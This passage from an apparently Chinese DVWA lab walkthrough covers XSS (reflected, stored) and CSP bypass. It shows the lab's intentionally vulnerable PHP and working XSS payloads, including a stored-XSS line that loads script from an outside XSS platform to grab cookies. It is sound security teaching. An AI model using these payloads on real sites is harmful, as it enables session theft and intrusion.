<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p><p><strong>漏洞利用</strong></p><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过<code>img、body</code>等标签的事件或者iframe等标签的src注入恶意的js代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素。</p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h1><h2 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2><p>明显的存储型XSS。<code>trim</code>去除数据末尾的空白符，<code>stripslashes(string)</code>函数删除字符串中的反斜杠。然后用SQL语句拼接到数据库里存储起来，并且再次访问时，会调用这些数据，写到一个一个div中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;guestbook_comments&quot;&gt;Name: test&lt;br &#x2F;&gt;Message: This is a test comment.&lt;br &#x2F;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;Lq8N&gt;  &#x2F;&#x2F;再次打开时会调用导致弹Cookie等</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/i8mPtOp7K6kG5sX.png"></p><h2 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将<code>message</code>中得标签去除，将<code>name</code>的<code>&lt;script&gt;</code>替换成空。<code>name</code>变量更好突破，双写，大小写，换成其他标签都可以。</p><p>下面给出两个payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. name大小写双写绕过,但因为name存在js的长度限制，可以用burp接收</span><br><span class="line">txtName&#x3D;&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;sCript&gt;&amp;mtxMessage&#x3D;2&amp;btnSign&#x3D;Sign+Guestbook</span><br><span class="line"></span><br><span class="line">2. name替换其他标签</span><br><span class="line">txtName&#x3D;&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;&amp;mtxMessage&#x3D;12138</span><br></pre></td></tr></table></figure><h2 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>name也是用了一个正则，把<code>&lt;script&gt;</code>大小写双写都包含了，但是一样可以利用其它标签和事件来触发js。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = stripslashes( $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $name = htmlspecialchars( $name );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, $message, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:name&#x27;</span>, $name, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。</p><h1 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h1><h2 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2><p>首先，何为CSP？CSP是内容安全策略（Content Security Policy），是一种声明机制，允许Web开发者在其应用程序上指定多个安全限制，由支持的用户代理（浏览器）来负责强制执行。CSP旨在“作为开发人员可以使用的工具，以各种方式保护其应用程序，减轻内容注入漏洞的风险和减少它们的应用程序执行的特权”。</p><p>实际应用中，配置了CSP策略，往往在请求头中出现<code>Content-Security-Policy</code> 和 <code>X-Content-Security-Policy</code> 或者 <code>X-Webkit-CSP</code>（X-*不推荐使用）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, jquery and google analytics.</span></span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://pastebin.com/raw/R570EE00</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>script-src &#39;self&#39;</code>是指允许同站的资源调用运行（js等），即这段代码使用了CSP信任了以下网站，这些网站的内容CSP都不会拦截</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本网站的资源</span><br><span class="line">https:&#x2F;&#x2F;pastebin.com  </span><br><span class="line">example.com </span><br><span class="line">code.jquery.com </span><br><span class="line">https:&#x2F;&#x2F;ssl.google-analytics.com</span><br></pre></td></tr></table></figure><p>于是我们可以利用其中一些可控的网站，写一些XSS等危险内容，再通过该网站调用，即利用白名单中的网站可控数据来打XSS。</p><p>发现<code>https://pastebin.com</code>是一个代码编辑网站，可以写代码存到这个网站的服务器，并且上面的代码中直接通过js引用，所以在这个网站中写一段<code>alert(&quot;hahaha&quot;)</code>，将地址提交到dvwa中即可弹窗。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/sDQ3twlSjxmPfqA.png"></p><h2 id="Medium-12"><a href="#Medium-12" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>​    <code>unsafe-inline</code>，允许使用内联资源，如内联<code>&lt; script&gt;</code>元素，<code>javascript:URL</code>，内联事件处理程序（如onclick）和内联<code>&lt; style&gt;</code>元素。必须包括单引号。<br>​    <code>nonce-source</code>，仅允许特定的内联脚本块，<code>nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&quot;</code></p><p>允许通过<code>&lt;script nonce=&quot;***&quot;&gt;</code>,来执行<code>***</code>部分的代码和脚本。</p><p>更多CSP<code>SourceValue</code>，参见<a href="http://cosmos-admin.hgame.day-day.work/">http://cosmos-admin.hgame.day-day.work</a></p></blockquote><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script nonce&#x3D;&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA&#x3D;&quot;&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>使用 ‘unsafe-inline’ 和 ‘unsafe-eval’ 都是不安全的，它们会使您的网站有跨站脚本攻击风险。</p></blockquote><h2 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现这个文件本身没什么问题，但是调用了一个<code>jsonp.php</code>，跟进一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (array_key_exists (<span class="string">&quot;callback&quot;</span>, $_GET)) &#123;</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $callback . <span class="string">&quot;(&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现<code>$callback</code>可控，而且直接拼接输出。回头一看，原页面中<code>include</code>也是可控的，而且是直接拼接到HTML body中输出的。但是因为有CSP，不可以直接无脑的去打payload</p><p><img src="https://i.loli.net/2020/03/03/Nndsi53TPAmjGwL.png"></p><p>联系<code>jsonp.php的$callback</code>，且符合CSP的同源规则，可以这样利用：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;&lt;script src&#x3D;&quot;source&#x2F;jsonp.php?callback&#x3D;alert(&#39;XSS&#39;);&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这样由include去调用<code>jsonp.php</code>，而<code>jsonp.php</code>中的参数可控且直接拼接，<code>json.php</code>,没有用CSP规则，这样就绕开了CSP完成了XSS攻击。</p><h2 id="Impossible-11"><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">$outp = <span class="keyword">array</span> (<span class="string">&quot;answer&quot;</span> =&gt; <span class="string">&quot;15&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;solveSum (&quot;</span>.json_encode($outp).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>jsonp_impossible.php</code>修复了<code>call_back</code>可控的问题。</p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">MD5 code from here</span></span><br><span class="line"><span class="string">https://github.com/blueimp/JavaScript-MD5</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var 